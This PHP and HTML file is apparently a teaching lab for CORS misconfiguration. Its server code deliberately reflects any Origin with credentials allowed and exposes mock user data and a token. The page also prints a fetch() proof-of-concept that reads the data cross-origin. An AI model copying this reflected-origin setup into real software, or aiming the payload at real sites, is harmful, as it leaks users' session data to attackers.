<?php
/**
 * CORS Misconfiguration Lab
 * Dibuat untuk simulasi edukasi keamanan web.
 * Target: Reflected Origin & Credentials Competence.
 */

session_start();

// --- LOGIKA KERENTANAN (VULNERABILITY LOGIC) ---
// Memeriksa apakah ada header Origin dari browser
if (isset($_SERVER['HTTP_ORIGIN'])) {
    $origin = $_SERVER['HTTP_ORIGIN'];

    // REVISI: Server secara membabi buta memantulkan (reflect) Origin apa pun.
    // Ini adalah kesalahan fatal dalam konfigurasi CORS.
    header("Access-Control-Allow-Origin: " . $origin);
    
    // Mengizinkan pengiriman kredensial (Cookie/Session) dari domain luar.
    header("Access-Control-Allow-Credentials: true");
    
    // Mengizinkan berbagai metode dan header tambahan.
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
}

// Menangani Preflight Request (OPTIONS)
// Browser modern akan mengirim OPTIONS sebelum request sebenarnya jika menggunakan credentials/custom headers.
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Data sensitif yang akan dicuri oleh penyerang
$userData = [
    "username" => "mrahmatt74",
    "role" => "Cybersecurity Analyst",
    "internal_token" => "ADR-SECRET-9928374655",
    "email" => "rahmat@adr-group.com",
    "status" => "Authenticated",
    "server_time" => date("Y-m-d H:i:s")
];

// Endpoint API: Jika ada parameter ?api=1, kembalikan JSON
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    echo json_encode($userData);
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Misconfig Lab | mrahmatt74</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #2c3e50; --danger: #e74c3c; --bg: #f4f7f6; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 5px solid var(--danger); }
        .api-box { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; margin: 20px 0; overflow: hidden; }
        .api-header { background: #eee; padding: 10px 15px; font-weight: bold; font-size: 0.9rem; color: var(--primary); }
        .api-content { padding: 15px; background: #2d2d2d; color: #f8f8f2; }
        pre { margin: 0; font-family: 'Consolas', monospace; }
        .payload-hint { background: #fff3cd; border-left: 5px solid #ffca28; padding: 15px; border-radius: 4px; color: #856404; }
        code { background: #e83e8c; color: white; padding: 2px 5px; border-radius: 4px; }
        .btn-back { text-decoration: none; color: white; background: var(--primary); padding: 8px 15px; border-radius: 5px; font-size: 0.9rem; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2><i class="fas fa-share-nodes"></i> CORS Misconfiguration Lab</h2>
        <a href="../../index.php" class="btn-back"><i class="fas fa-arrow-left"></i> Dashboard</a>
    </div>

    <div class="card">
        <p>Modul ini mensimulasikan API internal yang membocorkan data jika diakses dari domain luar melalui browser korban.</p>

        <div class="api-box">
            <div class="api-header">
                <span><i class="fas fa-lock"></i> Private API Endpoint (JSON):</span>
                <code>?api=1</code>
            </div>
            <div class="api-content">
                <pre><?php print_r($userData); ?></pre>
            </div>
        </div>

        <div class="payload-hint">
            <strong>Lab Objective:</strong><br>
            Gunakan script di bawah ini di situs eksternal (misalnya <strong>codepen.io</strong>) untuk mencuri data di atas:
            <pre style="background: #1e1e1e; color: #9cdcfe; padding: 15px; border-radius: 8px; margin-top: 10px; font-size: 0.85rem; overflow-x: auto;">
fetch('https://mrahmatt74.com/modules/client_side/cors_misconfig.php?api=1', {
    method: 'GET',
    credentials: 'include' 
})
.then(res => res.json())
.then(data => alert('DATA TERCURI: ' + JSON.stringify(data)))
.catch(err => console.error('Gagal:', err));</pre>
        </div>
        
        <p style="margin-top: 20px; font-size: 0.9rem; color: #666;">
            <i class="fas fa-info-circle"></i> <strong>Catatan:</strong> Kerentanan terjadi karena server menggunakan <code>HTTP_ORIGIN</code> secara langsung tanpa validasi whitelist.
        </p>
    </div>
</div>

</body>
</html>